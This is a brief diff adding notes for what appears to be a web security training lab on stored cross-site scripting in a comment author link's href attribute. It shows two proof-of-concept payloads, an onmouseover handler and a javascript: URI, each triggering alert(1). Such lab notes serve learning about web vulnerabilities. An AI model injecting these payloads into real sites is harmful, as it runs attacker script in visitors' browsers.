@@ -1,0 +1,8 @@
+Lab #2 - Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+Target Goal - Exploit stored xss vulnerability in the comment functionality.
+
+Analysis:
+
+<a id="author" href="https://test4.ca" onmouseover="alert(1)">
+<a id="author" href="javascript:alert(1)">
